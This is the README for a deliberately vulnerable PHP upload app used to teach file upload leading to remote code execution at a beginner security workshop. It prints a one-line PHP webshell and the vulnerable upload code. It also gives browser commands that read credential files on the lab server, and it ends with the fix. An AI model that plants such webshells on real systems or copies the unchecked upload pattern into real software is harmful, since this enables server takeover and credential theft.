# 📸 Securinets Photo Club — Vulnerable Upload Demo

A tiny PHP app for teaching **unrestricted file upload → RCE** at a Securinets
beginner workshop. Users log in, snap a selfie with their camera, and upload
it. The upload endpoint is broken on purpose: it trusts the filename the user
sends, so an attacker uploads `shell.php` instead of a JPEG and lands a
webshell.

> ⚠️ **Lab use only.** This app is deliberately insecure. Run it on
> `localhost` or an isolated workshop network. Do not expose it to the
> internet.

---

## Why file upload, not SSTI?

For beginners, the "aha" moment has to be *visible* and the payload has to be
*short*. File upload wins on both:

- Payload is one line everyone understands:
  `<?php system($_GET['cmd']); ?>`
- The story is memorable: *"you gave the site a picture — I gave it code."*
- The loot phase (`ls`, `cat`) uses shell commands beginners already recognise.
- SSTI needs Jinja context and a big ugly gadget chain — beginners lose the plot.

---

## Run it (30 seconds)

```bash
./RUN.sh          # or:  cd app && php -S 0.0.0.0:8000
```

Open <http://localhost:8000>. Log in with any demo account:

| user      | password       |
|-----------|----------------|
| alice     | sunshine123    |
| bob       | password1      |
| yasmine   | ensit2025      |

Take a selfie or upload an image → it appears on the dashboard. This is the
"normal" flow you show the audience first.

---

## The bug (one screen of code)

`app/upload.php`:

```php
$name = basename($_FILES['photo']['name']);   // <-- trusts the user
$dest = "$uploads/{$user}_$name";
move_uploaded_file($_FILES['photo']['tmp_name'], $dest);
```

Three missing checks: no extension whitelist, no MIME sniff, no rename.
And `uploads/` is inside the web root, so PHP files there **execute**.

---

## Workshop script (10 minutes, live)

### Act 1 — the honest user (2 min)
Log in as `alice`, snap a selfie, show it on the dashboard. Everything works.

### Act 2 — the attacker uploads code (3 min)

On the attacker's machine (or a second tab):

```bash
cat shell.php
```

Show the one line: `<?php system($_GET['cmd']); ?>`.

Log in as `bob`. On the "pick a file" input, choose **`shell.php`** instead of
a picture. Click Upload. The site happily reports:

> Saved as `bob_shell.php`

### Act 3 — the shell (2 min)

In the browser bar:

```
http://localhost:8000/uploads/bob_shell.php?cmd=id
http://localhost:8000/uploads/bob_shell.php?cmd=whoami
http://localhost:8000/uploads/bob_shell.php?cmd=ls%20-la
```

Each command runs on the server. This is the moment where the room goes quiet.
> **Path note.** The shell lives in `uploads/`, so paths are relative to
> there: `../secret/creds.txt`, `../index.php`. Or use absolute paths.


### Act 4 — the loot (3 min) 🎯 the emotional part

```
?cmd=ls
?cmd=ls%20../secret
?cmd=cat%20../secret/creds.txt
?cmd=cat%20../secret/notes.txt
?cmd=cat%20../index.php          # <-- the hardcoded user passwords
```

Point at the screen: *"these are YOUR photos in `uploads/`. This is the
admin's password file. This is a note saying yasmine reuses `ensit2025`
everywhere — including probably her real accounts. One bad upload endpoint
gave me everyone in this room."*

That's the whole talk.

---

## The fix (show this at the end — 2 min)

```php
$allowed = ['jpg' => 'image/jpeg', 'jpeg' => 'image/jpeg', 'png' => 'image/png'];
$ext = strtolower(pathinfo($_FILES['photo']['name'], PATHINFO_EXTENSION));

// 1. extension whitelist
if (!isset($allowed[$ext])) die('bad extension');

// 2. real MIME (reads magic bytes, not the header the user sent)
$mime = mime_content_type($_FILES['photo']['tmp_name']);
if ($mime !== $allowed[$ext]) die('bad file type');

// 3. rename — never trust the user's filename
$safe = bin2hex(random_bytes(8)) . '.' . $ext;

// 4. save outside the web root, OR drop a .htaccess that disables PHP
//    in uploads/ (php_flag engine off)
move_uploaded_file($_FILES['photo']['tmp_name'], "$uploads/$safe");
```

Any one of those four would have killed the attack. Defence in depth means
doing all four.

---

## Files

```
app/
  index.php        login
  dashboard.php    camera + upload form
  upload.php       the vulnerable endpoint
  logout.php
  style.css
  uploads/         where uploads land (writable, web-exposed — the bug)
  secret/          "loot" the attacker discovers
    creds.txt
    notes.txt
shell.php          the attacker's payload (kept out of app/ so it's clearly the exploit)
RUN.sh             one-command launcher
```

---

## After the workshop

Stop the server (Ctrl-C) and either delete the folder or keep it read-only.
Don't leave `php -S` running on a shared network.
